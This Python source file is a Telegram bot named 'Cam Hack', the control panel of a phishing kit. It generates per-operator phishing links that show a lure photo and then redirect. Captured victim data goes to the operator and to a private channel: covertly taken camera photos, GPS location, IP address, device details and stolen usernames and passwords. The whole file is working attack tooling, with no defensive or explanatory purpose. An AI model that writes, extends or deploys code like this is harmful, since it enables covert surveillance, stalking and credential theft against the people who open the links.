import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import uuid
import time
import threading
import requests
import base64
import os
from config import *

bot = telebot.TeleBot(BOT_TOKEN)

# In-memory storage
user_data = {}
link_cache = {}
victim_photos = {}

# ========== BOTTOM BUTTONS ==========
def get_bottom_buttons():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = KeyboardButton("📸 Cam Hack")
    btn2 = KeyboardButton("📱 Social Media")
    btn3 = KeyboardButton("📧 Gmail")
    btn4 = KeyboardButton("🎮 Free Fire")
    btn5 = KeyboardButton("🔗 All Links")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    return markup

# ========== LINK GENERATE ==========
def generate_phishing_link(user_id, target_type):
    if not BASE_URL:
        return "❌ BASE_URL missing!"
    unique_id = str(uuid.uuid4())[:8]
    link = f"{BASE_URL}/p/{unique_id}?type={target_type}&v={user_id}"
    link_cache[unique_id] = {"user_id": user_id, "time": time.time()}
    return link

# ========== /START ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    bot.send_message(
        user_id,
        "🔥 *Choose your weapon:*\n\n📸 Cam Hack (working)",
        reply_markup=get_bottom_buttons(),
        parse_mode="Markdown"
    )

# ========== BOTTOM BUTTONS ==========
@bot.message_handler(func=lambda message: True)
def handle_bottom_buttons(message):
    user_id = message.from_user.id
    text = message.text

    if text == "📸 Cam Hack":
        msg = bot.send_message(
            user_id,
            "📤 Send me a PHOTO (will be shown to victim)",
            reply_markup=get_bottom_buttons()
        )
        bot.register_next_step_handler(msg, get_cam_photo, user_id)

    elif text in ["📱 Social Media", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
        bot.send_message(
            user_id,
            f"⏳ *{text}* coming soon. Only *Cam Hack* works.",
            reply_markup=get_bottom_buttons(),
            parse_mode="Markdown"
        )
    else:
        bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())

# ========== CAM HACK: PHOTO ==========
def get_cam_photo(message, user_id):
    if message.photo:
        photo_id = message.photo[-1].file_id
        # Get direct URL
        file_info = bot.get_file(photo_id)
        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        
        user_data[user_id] = {"photo_url": photo_url, "photo_id": photo_id}
        victim_photos[str(user_id)] = photo_url
        
        # Store photo in server
        try:
            requests.post(f"{BASE_URL}/store_photo/{user_id}", json={"photo_url": photo_url}, timeout=5)
        except:
            pass
        
        bot.send_message(
            user_id,
            "📤 Now send REDIRECT LINK (URL where victim goes after capture)",
            reply_markup=get_bottom_buttons()
        )
        bot.register_next_step_handler(message, get_cam_redirect, user_id)
    else:
        bot.send_message(user_id, "❌ Send a PHOTO first.", reply_markup=get_bottom_buttons())

# ========== CAM HACK: REDIRECT ==========
def get_cam_redirect(message, user_id):
    redirect_url = message.text
    if redirect_url.startswith("http"):
        user_data[user_id]["redirect"] = redirect_url
        
        # Store redirect in server
        try:
            requests.post(f"{BASE_URL}/set_redirect/{user_id}", json={"url": redirect_url}, timeout=5)
        except:
            pass
        
        link = generate_phishing_link(user_id, "cam")
        if "❌" in link:
            bot.send_message(user_id, link, reply_markup=get_bottom_buttons())
            return
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
        )
        bot.send_message(
            user_id,
            f"✅ *CAMERA phishing link ready:*\n\n`{link}`\n\nVictim sees your photo → redirects to `{redirect_url}`",
            reply_markup=markup,
            parse_mode="Markdown"
        )
    else:
        bot.send_message(user_id, "❌ Valid URL starting with http:// or https://", reply_markup=get_bottom_buttons())
        bot.register_next_step_handler(message, get_cam_redirect, user_id)

# ========== INLINE CALLBACK ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_inline(call):
    if call.data == "copy":
        bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")

# ========== FORWARD DATA TO USER + CHANNEL ==========
def forward_to_user_and_channel(user_id, data):
    try:
        # --- USER ---
        user_text = f"📥 *Victim Data*\n🆔 {data.get('victim_id')}\n"
        device = data.get('device_info', {})
        if device:
            user_text += f"📱 {device.get('userAgent', '')[:40]}...\n"
            user_text += f"🔋 {device.get('battery', 'N/A')}  📶 {device.get('network', 'N/A')}\n"
        user_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        
        creds = data.get('creds')
        if creds:
            user_text += f"🔑 {creds.get('platform')}: {creds.get('username')} / {creds.get('password')}\n"
        
        bot.send_message(user_id, user_text, parse_mode="Markdown")

        # Photo to user
        photo = data.get('photo')
        if photo and photo.startswith('data:image'):
            try:
                b64 = photo.split(',')[1]
                with open('u_temp.jpg', 'wb') as f:
                    f.write(base64.b64decode(b64))
                with open('u_temp.jpg', 'rb') as f:
                    bot.send_photo(user_id, f)
                os.remove('u_temp.jpg')
            except:
                pass

        # Location to user
        loc = data.get('location')
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(user_id, loc['lat'], loc['lng'])

        # --- CHANNEL ---
        ch_text = f"📥 *New Victim Data*\n🆔 {data.get('victim_id')}\n"
        if device:
            ch_text += f"📱 {device.get('userAgent', '')[:40]}...\n"
            ch_text += f"🔋 {device.get('battery', 'N/A')}  📶 {device.get('network', 'N/A')}\n"
        ch_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        if creds:
            ch_text += f"🔑 {creds.get('platform')}: {creds.get('username')} / {creds.get('password')}\n"
        
        bot.send_message(PRIVATE_CHANNEL_ID, ch_text, parse_mode="Markdown")

        # Photo to channel
        if photo and photo.startswith('data:image'):
            try:
                b64 = photo.split(',')[1]
                with open('c_temp.jpg', 'wb') as f:
                    f.write(base64.b64decode(b64))
                with open('c_temp.jpg', 'rb') as f:
                    bot.send_photo(PRIVATE_CHANNEL_ID, f)
                os.remove('c_temp.jpg')
            except:
                pass

        # Location to channel
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(PRIVATE_CHANNEL_ID, loc['lat'], loc['lng'])

    except Exception as e:
        print(f"Forward error: {e}")

# ========== CLEAN LINKS ==========
def clean_links():
    while True:
        time.sleep(600)
        now = time.time()
        to_del = [k for k, v in link_cache.items() if now - v["time"] > 600]
        for k in to_del:
            del link_cache[k]
        print(f"🧹 Deleted {len(to_del)} old links")

threading.Thread(target=clean_links, daemon=True).start()

# ========== RUN ==========
if __name__ == "__main__":
    print("🤖 Cam Hack is working...")
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
